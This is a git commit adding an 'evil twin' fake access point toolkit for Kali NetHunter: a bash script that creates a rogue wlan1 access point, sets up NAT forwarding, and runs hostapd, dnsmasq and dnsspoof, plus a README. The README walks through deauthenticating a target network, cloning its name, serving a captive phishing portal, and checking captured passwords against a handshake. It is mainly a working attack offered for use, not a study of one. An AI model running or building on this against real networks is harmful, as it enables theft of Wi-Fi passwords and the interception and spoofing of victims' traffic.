3e98522430315bd67701b1bddf0e42c6e799b997
ikteach <86849090+ikteach@users.noreply.github.com>
2024-11-19 18:13:52 +0530

    Add files via upload

---
+++ 4g-ap.sh
@@ -0,0 +1,61 @@
+#!/bin/bash
+# Create Fake Access point 
+# Created By Ikteach
+cat << EOF
+
+  ___ _  _______ ___   _   ___ _  _ 
+ |_ _| |/ /_   _| __| /_\ / __| || |
+  | || ' <  | | | _| / _ \ (__| __ |
+ |___|_|\_\ |_| |___/_/ \_\___|_||_|
+                                Version : 1.0
+                             Created By : Ikteach
+                                YouTube : /ikteachoffical                 
+
+EOF
+sleep 4
+
+echo "Checking default rule number.."
+for table in $(ip rule list | awk -F"lookup" '{print $2}'); do
+DEF=`ip route show table $table|grep default|grep rmnet_data2`
+  if ! [ -z "$DEF" ]; then
+     break
+  fi
+done
+echo "Default rule number is $table"
+echo "Checking for existing wlan1 interface..."
+if ip link show wlan1; then
+  echo "wlan 1 exists, continuing.."
+else
+  if [[ `iw list | grep '* AP'` == *"* AP"* ]]; then
+    echo "wlan0 supports AP mode, creating AP interface.."
+    iw dev wlan0 interface add wlan1 type __ap
+    ip addr flush wlan1
+    ip addr flush wlan1
+    ip link set up dev wlan1
+  else
+    echo "wlan0 doesn't support AP mode, exiting.."
+    exit 0
+  fi
+fi
+echo "Adding iptables for internet sharing..."
+iptables --flush
+
+ifconfig wlan1 up 10.0.0.1 netmask 255.255.255.0
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80
+iptables --table nat --append POSTROUTING --out-interface rmnet_data2 -j MASQUERADE
+iptables --append FORWARD --in-interface wlan1 -j ACCEPT
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+ip rule add from all lookup main pref 1 2> /dev/null
+ip rule add from all iif lo oif wlan1 uidrange 0-0 lookup 97 pref 11000 2> /dev/null
+ip rule add from all iif lo oif rmnet_data2 lookup $table pref 17000 2> /dev/null
+ip rule add from all iif lo oif wlan1 lookup 97 pref 17000 2> /dev/null
+ip rule add from all iif wlan1 lookup $table pref 21000 2> /dev/null
+echo "Starting captiveflask and hostapd.conf..."
+sleep 20 && cd /fap & sudo hostapd /fap/hostapd.conf &
+sleep 5
+sudo dnsmasq -C dnsmasq.conf -d &
+sleep 5
+sudo dnsspoof -i wlan1
--- README.md
+++ README.md
@@ -1,1 +1,58 @@
-# FakeAP_Nethunter
+# FakeAP_Nethunter #
+Made by me Ikteach & Dr. Ismail saad
+
+This eviltwin script let you run fake access point portal with verification of any given handshake on vritually created wlan1 using Kali Nethunter
+If you want to Deauth orignal network into Attack to disconnect all connected with network then you only need 1 external adapter.
+
+
+## How to Usage ##
+
+1.nano /etc/apache2/sites-enabled/000-default.conf
+
+copy everything inside conf.txt and paste it inside default.conf like this given image
+
+![Screenshot_20241118-105842_NetHunter_Terminal](https://github.com/user-attachments/assets/04756c79-7b68-40a1-812a-e0992d694d30)
+
+2.run this command:
+rm -rf /var/www/html/*
+
+then
+
+copy all portal files from inside portal folder to /var/www/html
+
+3. run this command: 
+a2enmod rewrite 
+
+then 
+run : sudo service apache2 start 
+
+***important*** : before moving forward make sure portal is working fine by navagating to 127.0.0.1 in web browser .. if it show forbidden you need to manage permission with chmod commands
+
+4. copy target handshake inside our main folder and rename it to evil.cap
+
+5. run this command :
+
+aircrack-ng evil.cap
+ 
+you will get your target bssid copy it .. 
+then 
+nano passapi.py  
+replace it in the 5th line 
+
+7.python3 passapi.py
+
+8. deauth your target network with external adapter and make sure adapter is recognised as wlan2
+
+9.nano hostapd.conf and change network name tenda to your target network name
+
+8.if you wanna share internet from internal wifi use fakeap.sh .. if you wanna share mobile internet use 4g script .. make sure to edit path files inside the script depending on your files locations then you can run the script
+
+you can use any portal you want with the script .. if its flask portal make sure to host it on 10.0.0.1 and port 80
+
+want to thanks @dr_ismail_saad to Check all codes and test it 
+want to thanks @yesimxev for internet sharing rules
+
+and thanks @Justxd22 for handshake
+verification methods and portals you can check his repo here
+
+https://github.com/Justxd22/Eviltwin-Huawei_XD
